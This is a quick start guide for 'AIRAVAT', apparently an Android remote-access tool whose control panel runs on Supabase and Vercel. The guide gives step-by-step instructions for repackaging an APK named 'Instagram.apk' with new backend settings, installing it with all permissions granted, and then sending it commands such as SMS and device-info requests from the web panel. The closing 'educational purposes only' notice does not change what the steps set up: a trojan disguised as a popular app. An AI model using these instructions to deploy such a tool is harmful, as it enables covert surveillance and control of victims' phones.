# Quick Start Guide - AIRAVAT Supabase

This is a quick setup guide for getting AIRAVAT running with Supabase. For detailed instructions, see [MIGRATION_GUIDE.md](MIGRATION_GUIDE.md).

## 🚀 Quick Setup (5 minutes)

### Step 1: Supabase Account Setup
1. Go to [supabase.com](https://supabase.com) and create a free account
2. Create a new project (choose any name)
3. Wait for project creation (2-3 minutes)
4. Go to Settings → API and copy:
   - Project URL
   - `anon` `public` key
   - `service_role` `secret` key

### Step 2: Database Setup
1. In Supabase dashboard, go to SQL Editor
2. Copy the entire content from `supabase-schema.sql`
3. Paste and run the SQL script
4. Verify tables are created in Table Editor

### Step 3: Web Panel Setup
Run the automated setup script:
```bash
cd AIRAVAT
chmod +x deploy.sh
./deploy.sh
```

Or manually update `WEB PANEL/index.html`:
```javascript
const supabaseConfig = {
  url: "https://your-project-id.supabase.co",  // Your Project URL
  key: "your-anon-key"                         // Your anon public key
};
```

### Step 4: Deploy to Vercel
1. Install Vercel CLI: `npm install -g vercel`
2. Login: `vercel login`
3. Deploy: `vercel --prod`
4. Your panel is now live at the provided URL!

### Step 5: Android APK Setup
1. Decompile `ANDROID APP/Instagram.apk` using APKTool
2. Replace `res/values/strings.xml` with content from `ANDROID APP/supabase_strings.xml`
3. Update the Supabase configuration values
4. Add `ANDROID APP/SupabaseClient.java` to your project
5. Replace Firebase code with Supabase calls
6. Recompile and sign the APK

## ✅ Testing

1. Install the modified APK on a test device
2. Grant all required permissions
3. Check if device appears in your web panel
4. Test sending commands (SMS, device info, etc.)

## 🆘 Need Help?

- **Database Issues**: Check Supabase logs in dashboard
- **Web Panel Issues**: Check browser console for errors  
- **APK Issues**: Use Android Studio logcat for debugging
- **Deployment Issues**: Check Vercel deployment logs

## 📚 Full Documentation

For detailed step-by-step instructions with screenshots and troubleshooting, see:
- [MIGRATION_GUIDE.md](MIGRATION_GUIDE.md) - Complete migration guide
- [README.md](README.md) - Full project documentation

## ⚠️ Legal Notice

This software is for educational purposes only. Ensure you have proper authorization before using this tool. Users are responsible for compliance with all applicable laws.
